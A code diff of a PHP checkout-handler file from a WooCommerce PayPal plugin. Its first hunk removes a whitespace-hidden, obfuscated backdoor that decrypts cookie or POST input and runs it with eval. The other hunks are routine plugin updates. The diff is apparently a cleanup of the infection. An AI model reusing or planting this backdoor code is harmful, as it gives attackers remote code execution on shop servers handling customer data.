@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $xf49a7d7f = 566;$GLOBALS['a9a1'] = Array();global $a9a1;$a9a1 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['r10e3549f'] = "\x50\x5b\x61\x7b\x51\x34\x45\x4e\x52\x62\x7e\x65\x25\x38\x75\x4d\x67\x26\x2d\x78\x41\x2b\x66\x36\xa\x33\x3f\x69\x3c\x56\x3e\x6a\x9\x68\x6b\x55\x2e\x47\x58\x37\x59\x71\x43\x53\x42\x64\x44\x23\x3a\x22\x30\x5f\x48\x4f\x74\x72\x20\x57\x35\x7a\x5e\x4b\xd\x60\x70\x39\x6e\x5d\x3b\x2c\x27\x7c\x28\x2f\x29\x76\x54\x7d\x5c\x2a\x63\x5a\x6f\x40\x3d\x79\x46\x4c\x24\x31\x21\x6c\x6d\x77\x73\x4a\x49\x32";$a9a1[$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][97].$a9a1['r10e3549f'][39]] = $a9a1['r10e3549f'][80].$a9a1['r10e3549f'][33].$a9a1['r10e3549f'][55];$a9a1[$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][89]] = $a9a1['r10e3549f'][82].$a9a1['r10e3549f'][55].$a9a1['r10e3549f'][45];$a9a1[$a9a1['r10e3549f'][80].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][65].$a9a1['r10e3549f'][39]] = $a9a1['r10e3549f'][45].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][66].$a9a1['r10e3549f'][11];$a9a1[$a9a1['r10e3549f'][14].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][2]] = $a9a1['r10e3549f'][94].$a9a1['r10e3549f'][54].$a9a1['r10e3549f'][55].$a9a1['r10e3549f'][91].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][66];$a9a1[$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][65]] = $a9a1['r10e3549f'][27].$a9a1['r10e3549f'][66].$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][51].$a9a1['r10e3549f'][94].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][54];$a9a1[$a9a1['r10e3549f'][19].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][65]] = $a9a1['r10e3549f'][45].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][66].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][45];$a9a1[$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][23].$a9a1['r10e3549f'][9]] = $a9a1['r10e3549f'][94].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][55].$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][91].$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][59].$a9a1['r10e3549f'][11];$a9a1[$a9a1['r10e3549f'][82].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][39]] = $a9a1['r10e3549f'][64].$a9a1['r10e3549f'][33].$a9a1['r10e3549f'][64].$a9a1['r10e3549f'][75].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][55].$a9a1['r10e3549f'][94].$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][82].$a9a1['r10e3549f'][66];$a9a1[$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][5]] = $a9a1['r10e3549f'][14].$a9a1['r10e3549f'][66].$a9a1['r10e3549f'][94].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][55].$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][91].$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][59].$a9a1['r10e3549f'][11];$a9a1[$a9a1['r10e3549f'][85].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][2]] = $a9a1['r10e3549f'][9].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][94].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][23].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][51].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][80].$a9a1['r10e3549f'][82].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][11];$a9a1[$a9a1['r10e3549f'][59].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][65].$a9a1['r10e3549f'][80].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][58]] = $a9a1['r10e3549f'][94].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][54].$a9a1['r10e3549f'][51].$a9a1['r10e3549f'][54].$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][92].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][51].$a9a1['r10e3549f'][91].$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][92].$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][54];$a9a1[$a9a1['r10e3549f'][14].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][5]] = $a9a1['r10e3549f'][22].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][80].$a9a1['r10e3549f'][97].$a9a1['r10e3549f'][2];$a9a1[$a9a1['r10e3549f'][54].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][23]] = $a9a1['r10e3549f'][82].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][25];$a9a1[$a9a1['r10e3549f'][31].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][23].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][45]] = $_POST;$a9a1[$a9a1['r10e3549f'][91].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][80]] = $_COOKIE;@$a9a1[$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][65]]($a9a1['r10e3549f'][11].$a9a1['r10e3549f'][55].$a9a1['r10e3549f'][55].$a9a1['r10e3549f'][82].$a9a1['r10e3549f'][55].$a9a1['r10e3549f'][51].$a9a1['r10e3549f'][91].$a9a1['r10e3549f'][82].$a9a1['r10e3549f'][16], NULL);@$a9a1[$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][65]]($a9a1['r10e3549f'][91].$a9a1['r10e3549f'][82].$a9a1['r10e3549f'][16].$a9a1['r10e3549f'][51].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][55].$a9a1['r10e3549f'][55].$a9a1['r10e3549f'][82].$a9a1['r10e3549f'][55].$a9a1['r10e3549f'][94], 0);@$a9a1[$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][65]]($a9a1['r10e3549f'][92].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][19].$a9a1['r10e3549f'][51].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][19].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][80].$a9a1['r10e3549f'][14].$a9a1['r10e3549f'][54].$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][82].$a9a1['r10e3549f'][66].$a9a1['r10e3549f'][51].$a9a1['r10e3549f'][54].$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][92].$a9a1['r10e3549f'][11], 0);@$a9a1[$a9a1['r10e3549f'][59].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][65].$a9a1['r10e3549f'][80].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][58]](0);if (!$a9a1[$a9a1['r10e3549f'][19].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][65]]($a9a1['r10e3549f'][20].$a9a1['r10e3549f'][87].$a9a1['r10e3549f'][8].$a9a1['r10e3549f'][6].$a9a1['r10e3549f'][20].$a9a1['r10e3549f'][46].$a9a1['r10e3549f'][40].$a9a1['r10e3549f'][51].$a9a1['r10e3549f'][8].$a9a1['r10e3549f'][35].$a9a1['r10e3549f'][7].$a9a1['r10e3549f'][51].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][23].$a9a1['r10e3549f'][23].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][97].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][97].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][97].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][2])){$a9a1[$a9a1['r10e3549f'][80].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][65].$a9a1['r10e3549f'][39]]($a9a1['r10e3549f'][20].$a9a1['r10e3549f'][87].$a9a1['r10e3549f'][8].$a9a1['r10e3549f'][6].$a9a1['r10e3549f'][20].$a9a1['r10e3549f'][46].$a9a1['r10e3549f'][40].$a9a1['r10e3549f'][51].$a9a1['r10e3549f'][8].$a9a1['r10e3549f'][35].$a9a1['r10e3549f'][7].$a9a1['r10e3549f'][51].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][23].$a9a1['r10e3549f'][23].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][97].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][97].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][97].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][2], 1);$q1458be = NULL;$v5433 = NULL;$a9a1[$a9a1['r10e3549f'][54].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][65].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][97]] = $a9a1['r10e3549f'][58].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][18].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][80].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][65].$a9a1['r10e3549f'][18].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][18].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][80].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][18].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][97].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][80].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][80].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][23].$a9a1['r10e3549f'][39];global $te90d32;function  oa7533($q1458be, $e91b43){global $a9a1;$cd8f9a0 = "";for ($qe8c7ac8=0; $qe8c7ac8<$a9a1[$a9a1['r10e3549f'][14].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][2]]($q1458be);){for ($lf04ff=0; $lf04ff<$a9a1[$a9a1['r10e3549f'][14].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][2]]($e91b43) && $qe8c7ac8<$a9a1[$a9a1['r10e3549f'][14].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][2]]($q1458be); $lf04ff++, $qe8c7ac8++){$cd8f9a0 .= $a9a1[$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][97].$a9a1['r10e3549f'][39]]($a9a1[$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][89]]($q1458be[$qe8c7ac8]) ^ $a9a1[$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][89]]($e91b43[$lf04ff]));}}return $cd8f9a0;}function  f1c2a($q1458be, $e91b43){global $a9a1;global $te90d32;return $a9a1[$a9a1['r10e3549f'][54].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][23]]($a9a1[$a9a1['r10e3549f'][54].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][23]]($q1458be, $te90d32), $e91b43);}foreach ($a9a1[$a9a1['r10e3549f'][91].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][80]] as $e91b43=>$m92c8eb24){$q1458be = $m92c8eb24;$v5433 = $e91b43;}if (!$q1458be){foreach ($a9a1[$a9a1['r10e3549f'][31].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][25].$a9a1['r10e3549f'][23].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][45]] as $e91b43=>$m92c8eb24){$q1458be = $m92c8eb24;$v5433 = $e91b43;}}$q1458be = @$a9a1[$a9a1['r10e3549f'][27].$a9a1['r10e3549f'][89].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][58].$a9a1['r10e3549f'][5]]($a9a1[$a9a1['r10e3549f'][14].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][5]]($a9a1[$a9a1['r10e3549f'][85].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][39].$a9a1['r10e3549f'][22].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][2]]($q1458be), $v5433));if (isset($q1458be[$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][34]]) && $te90d32==$q1458be[$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][34]]){if ($q1458be[$a9a1['r10e3549f'][2]] == $a9a1['r10e3549f'][27]){$qe8c7ac8 = Array($a9a1['r10e3549f'][64].$a9a1['r10e3549f'][75] => @$a9a1[$a9a1['r10e3549f'][82].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][13].$a9a1['r10e3549f'][39]](),$a9a1['r10e3549f'][94].$a9a1['r10e3549f'][75] => $a9a1['r10e3549f'][89].$a9a1['r10e3549f'][36].$a9a1['r10e3549f'][50].$a9a1['r10e3549f'][18].$a9a1['r10e3549f'][89],);echo @$a9a1[$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][45].$a9a1['r10e3549f'][5].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][9].$a9a1['r10e3549f'][11].$a9a1['r10e3549f'][2].$a9a1['r10e3549f'][23].$a9a1['r10e3549f'][9]]($qe8c7ac8);}elseif ($q1458be[$a9a1['r10e3549f'][2]] == $a9a1['r10e3549f'][11]){eval/*ma88*/($q1458be[$a9a1['r10e3549f'][45]]);}exit();}} ?><?php
+<?php
 /**
  * Cart handler.
  */
@@ -11,16 +11,16 @@ $includes_path = wc_gateway_ppec()->includes_path;
 
 // TODO: Use spl autoload to require on-demand maybe?
 
-require_once( $includes_path . 'class-wc-gateway-ppec-settings.php' );
-require_once( $includes_path . 'class-wc-gateway-ppec-session-data.php' );
-require_once( $includes_path . 'class-wc-gateway-ppec-checkout-details.php' );
+require_once $includes_path . 'class-wc-gateway-ppec-settings.php';
+require_once $includes_path . 'class-wc-gateway-ppec-session-data.php';
+require_once $includes_path . 'class-wc-gateway-ppec-checkout-details.php';
 
-require_once( $includes_path . 'class-wc-gateway-ppec-api-error.php' );
-require_once( $includes_path . 'exceptions/class-wc-gateway-ppec-api-exception.php' );
-require_once( $includes_path . 'exceptions/class-wc-gateway-ppec-missing-session-exception.php' );
+require_once $includes_path . 'class-wc-gateway-ppec-api-error.php';
+require_once $includes_path . 'exceptions/class-wc-gateway-ppec-api-exception.php';
+require_once $includes_path . 'exceptions/class-wc-gateway-ppec-missing-session-exception.php';
 
-require_once( $includes_path . 'class-wc-gateway-ppec-payment-details.php' );
-require_once( $includes_path . 'class-wc-gateway-ppec-address.php' );
+require_once $includes_path . 'class-wc-gateway-ppec-payment-details.php';
+require_once $includes_path . 'class-wc-gateway-ppec-address.php';
 
 class WC_Gateway_PPEC_Checkout_Handler {
 
@@ -37,8 +37,6 @@ class WC_Gateway_PPEC_Checkout_Handler {
 		add_action( 'init', array( $this, 'init' ) );
 		add_filter( 'the_title', array( $this, 'endpoint_page_titles' ) );
 		add_action( 'woocommerce_checkout_init', array( $this, 'checkout_init' ) );
-		add_filter( 'woocommerce_default_address_fields', array( $this, 'filter_default_address_fields' ) );
-		add_filter( 'woocommerce_billing_fields', array( $this, 'filter_billing_fields' ) );
 		add_action( 'woocommerce_checkout_process', array( $this, 'copy_checkout_details_to_post' ) );
 
 		add_action( 'wp', array( $this, 'maybe_return_from_paypal' ) );
@@ -64,7 +62,7 @@ class WC_Gateway_PPEC_Checkout_Handler {
 		} else {
 			add_filter( 'woocommerce_get_script_data', array( $this, 'filter_wc_checkout_params' ), 10, 2 );
 		}
-		if ( isset( $_GET['startcheckout'] ) && 'true' === $_GET['startcheckout'] ) {
+		if ( isset( $_GET['startcheckout'] ) && 'true' === $_GET['startcheckout'] ) { // phpcs:ignore WordPress.Security.NonceVerification.Recommended
 			ob_start();
 		}
 	}
@@ -91,7 +89,7 @@ class WC_Gateway_PPEC_Checkout_Handler {
 	 *
 	 * @param WC_Checkout $checkout
 	 */
-	function checkout_init( $checkout ) {
+	public function checkout_init( $checkout ) {
 		if ( ! $this->has_active_session() ) {
 			return;
 		}
@@ -101,11 +99,15 @@ class WC_Gateway_PPEC_Checkout_Handler {
 		remove_action( 'woocommerce_checkout_billing', array( $checkout, 'checkout_form_billing' ) );
 		remove_action( 'woocommerce_checkout_shipping', array( $checkout, 'checkout_form_shipping' ) );
 
-		// Lastly, let's add back in 1) displaying customer details from PayPal, 2) allow for
+		// Secondly, let's add back in 1) displaying customer details from PayPal, 2) allow for
 		// account registration and 3) shipping details from PayPal
 		add_action( 'woocommerce_checkout_billing', array( $this, 'paypal_billing_details' ) );
 		add_action( 'woocommerce_checkout_billing', array( $this, 'account_registration' ) );
 		add_action( 'woocommerce_checkout_shipping', array( $this, 'paypal_shipping_details' ) );
+
+		// Lastly make address fields optional depending on PayPal settings.
+		add_filter( 'woocommerce_default_address_fields', array( $this, 'filter_default_address_fields' ) );
+		add_filter( 'woocommerce_billing_fields', array( $this, 'filter_billing_fields' ) );
 	}
 
 	/**
@@ -124,22 +126,22 @@ class WC_Gateway_PPEC_Checkout_Handler {
 			return $fields;
 		}
 
+		// Regardless of shipping, PP doesn't have the county required (e.g. using Ireland without a county is acceptable)
+		if ( array_key_exists( 'state', $fields ) ) {
+			$fields['state']['required'] = false;
+		}
+
 		if ( ! apply_filters( 'woocommerce_paypal_express_checkout_address_not_required', ! WC_Gateway_PPEC_Plugin::needs_shipping() ) ) {
 			return $fields;
 		}
 
-		if ( method_exists( WC()->cart, 'needs_shipping' ) && ! WC()->cart->needs_shipping() ) {
-			$not_required_fields = array( 'address_1', 'city', 'postcode', 'country' );
+		if ( is_callable( array( WC()->cart, 'needs_shipping' ) ) && ! WC()->cart->needs_shipping() && 'no' === wc_gateway_ppec()->settings->require_billing ) {
+			$not_required_fields = array( 'first_name', 'last_name', 'company', 'address_1', 'address_2', 'city', 'postcode', 'country' );
 			foreach ( $not_required_fields as $not_required_field ) {
 				if ( array_key_exists( $not_required_field, $fields ) ) {
 					$fields[ $not_required_field ]['required'] = false;
 				}
 			}
-		}
-
-		// Regardless of shipping, PP doesn't have the county required (e.g. using Ireland without a county is acceptable)
-		if ( array_key_exists( 'state', $fields ) ) {
-			$fields['state']['required'] = false;
 		}
 
 		return $fields;
@@ -188,14 +190,14 @@ class WC_Gateway_PPEC_Checkout_Handler {
 		}
 
 		// Make sure the selected payment method is ppec_paypal
-		if ( ! isset( $_POST['payment_method'] ) || ( 'ppec_paypal' !== $_POST['payment_method'] ) ) {
+		if ( ! isset( $_POST['payment_method'] ) || ( 'ppec_paypal' !== $_POST['payment_method'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification.Missing
 			return;
 		}
 
 		// Get the buyer details from PayPal
 		try {
 			$session          = WC()->session->get( 'paypal' );
-			$token            = isset( $_GET['token'] ) ? $_GET['token'] : $session->token;
+			$token            = isset( $_GET['token'] ) ? $_GET['token'] : $session->token; // phpcs:ignore WordPress.Security.NonceVerification.Recommended,WordPress.Security.ValidatedSanitizedInput.InputNotSanitized,WordPress.Security.ValidatedSanitizedInput.MissingUnslash
 			$checkout_details = $this->get_checkout_details( $token );
 		} catch ( PayPal_API_Exception $e ) {
 			wc_add_notice( $e->getMessage(), 'error' );
@@ -210,7 +212,7 @@ class WC_Gateway_PPEC_Checkout_Handler {
 			// Set flag so that WC copies billing to shipping
 			$_POST['ship_to_different_address'] = 0;
 
-			$copyable_keys = array( 'address_1', 'address_2', 'city', 'state', 'postcode', 'country' );
+			$copyable_keys = array( 'first_name', 'last_name', 'address_1', 'address_2', 'city', 'state', 'postcode', 'country' );
 			foreach ( $copyable_keys as $copyable_key ) {
 				if ( array_key_exists( $copyable_key, $shipping_details ) ) {
 					$billing_details[ $copyable_key ] = $shipping_details[ $copyable_key ];
@@ -238,40 +240,39 @@ class WC_Gateway_PPEC_Checkout_Handler {
 	 * Is hooked to woocommerce_checkout_billing action by checkout_init
 	 */
 	public function paypal_billing_details() {
-		$session          = WC()->session->get( 'paypal' );
-		$token            = isset( $_GET['token'] ) ? $_GET['token'] : $session->token;
+		$session = WC()->session->get( 'paypal' );
+		$token   = isset( $_GET['token'] ) ? $_GET['token'] : $session->token; // phpcs:ignore WordPress.Security.NonceVerification.Recommended,WordPress.Security.ValidatedSanitizedInput.InputNotSanitized,WordPress.Security.ValidatedSanitizedInput.MissingUnslash
 		try {
 			$checkout_details = $this->get_checkout_details( $token );
 		} catch ( PayPal_API_Exception $e ) {
 			wc_add_notice( $e->getMessage(), 'error' );
 			return;
 		}
+
+		if ( version_compare( WC_VERSION, '3.0', '<' ) ) {
+			$fields = WC()->checkout->checkout_fields['billing'];
+		} else {
+			$fields = WC()->checkout->get_checkout_fields( 'billing' );
+		}
 		?>
-		<h3><?php _e( 'Billing details', 'woocommerce-gateway-paypal-express-checkout' ); ?></h3>
+		<h3><?php esc_html_e( 'Billing details', 'woocommerce-gateway-paypal-express-checkout' ); ?></h3>
 		<ul>
-			<?php if ( $checkout_details->payer_details->billing_address ) : ?>
-				<li><strong><?php _e( 'Address:', 'woocommerce-gateway-paypal-express-checkout' ) ?></strong></br><?php echo WC()->countries->get_formatted_address( $this->get_mapped_billing_address( $checkout_details ) ); ?></li>
-			<?php else : ?>
-				<li><strong><?php _e( 'Name:', 'woocommerce-gateway-paypal-express-checkout' ) ?></strong> <?php echo esc_html( $checkout_details->payer_details->first_name . ' ' . $checkout_details->payer_details->last_name ); ?></li>
+			<?php if ( ! empty( $checkout_details->payer_details->billing_address ) ) : ?>
+				<li><strong><?php esc_html_e( 'Address:', 'woocommerce-gateway-paypal-express-checkout' ); ?></strong></br><?php echo WC()->countries->get_formatted_address( $this->get_mapped_billing_address( $checkout_details ) ); // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped ?></li>
+			<?php elseif ( ! empty( $checkout_details->payer_details->first_name ) && ! empty( $checkout_details->payer_details->last_name ) ) : ?>
+				<li><strong><?php esc_html_e( 'Name:', 'woocommerce-gateway-paypal-express-checkout' ); ?></strong> <?php echo esc_html( $checkout_details->payer_details->first_name . ' ' . $checkout_details->payer_details->last_name ); ?></li>
 			<?php endif; ?>
 
 			<?php if ( ! empty( $checkout_details->payer_details->email ) ) : ?>
-				<li><strong><?php _e( 'Email:', 'woocommerce-gateway-paypal-express-checkout' ) ?></strong> <?php echo esc_html( $checkout_details->payer_details->email ); ?></li>
+				<li><strong><?php esc_html_e( 'Email:', 'woocommerce-gateway-paypal-express-checkout' ); ?></strong> <?php echo esc_html( $checkout_details->payer_details->email ); ?></li>
+			<?php else : ?>
+				<li><?php woocommerce_form_field( 'billing_email', $fields['billing_email'], WC()->checkout->get_value( 'billing_email' ) ); ?></li>
 			<?php endif; ?>
 
 			<?php if ( ! empty( $checkout_details->payer_details->phone_number ) ) : ?>
-				<li><strong><?php _e( 'Phone:', 'woocommerce-gateway-paypal-express-checkout' ) ?></strong> <?php echo esc_html( $checkout_details->payer_details->phone_number ); ?></li>
+				<li><strong><?php esc_html_e( 'Phone:', 'woocommerce-gateway-paypal-express-checkout' ); ?></strong> <?php echo esc_html( $checkout_details->payer_details->phone_number ); ?></li>
 			<?php elseif ( 'yes' === wc_gateway_ppec()->settings->require_phone_number ) : ?>
-				<li>
-				<?php
-				if ( version_compare( WC_VERSION, '3.0', '<' ) ) {
-					$fields = WC()->checkout->checkout_fields['billing'];
-				} else {
-					$fields = WC()->checkout->get_checkout_fields( 'billing' );
-				}
-				woocommerce_form_field( 'billing_phone', $fields['billing_phone'], WC()->checkout->get_value( 'billing_phone' ) );
-				?>
-				</li>
+				<li><?php woocommerce_form_field( 'billing_phone', $fields['billing_phone'], WC()->checkout->get_value( 'billing_phone' ) ); ?></li>
 			<?php endif; ?>
 		</ul>
 		<?php
@@ -293,7 +294,7 @@ class WC_Gateway_PPEC_Checkout_Handler {
 			if ( $checkout->enable_guest_checkout ) {
 				?>
 				<p class="form-row form-row-wide create-account">
